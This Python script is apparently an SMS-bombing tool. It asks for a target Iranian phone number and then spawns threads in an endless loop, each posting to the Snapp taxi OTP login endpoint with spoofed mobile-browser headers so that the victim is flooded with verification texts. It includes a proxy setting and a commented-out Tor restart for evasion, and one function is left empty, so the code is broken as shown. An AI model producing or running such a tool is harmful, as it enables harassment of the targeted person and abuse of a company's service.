import os
import time
import requests
from threading import Thread
from colorama import Fore
from time import sleep
proxy = {"https": "127.0.0.1.8000"}
os.system("clear")
print(Fore.GREEN)
print("""      __A_A___A_A_A_A_A__A_A_A__A_
                   |                                                               |
                   |            ____                    ____                |
                   |                                                               |
                   |              ●                        ●                 |
                   |                                                               |
                   |                                                               |
                   |                            |     |                            |
                   |                            |_ _|                            |
                   |                                                               |
                   |                |\______________/|               |
                   |                |                              |               |
                    \               \ ______________/              /  
                      \                                                        /
                        \                                                    /
                          |                                                  |
                          |__________________________ |
                           
""")
sleep(2)
os.system("clear")
print(Fore.GREEN)
print("""
amir.bomb.yessssss.                                                                                                                    
""")

def snap(phone):
    #snap api
    snapH = {"Host": "app.snapp.taxi", "content-length": "16", "x-app-name": "passenger-pwa", "x-app-version": "5.0.1", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-J415F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
        if "OK" in snapR.text:
            print (Fore.RED+"[+]snap SENDED")
        else:
            print (Fore.GREEN+"[+]snap SEND")
    except:
        print ("not send")

def adanbaba(phone):

try:
    phone = str(input("↦Target Phone (+98xxxxxxx): "))
    while True:
        Thread(target=snap, args=[phone]).start()
        #os.system("killall -HUP tor")
        


except:
        print("not")
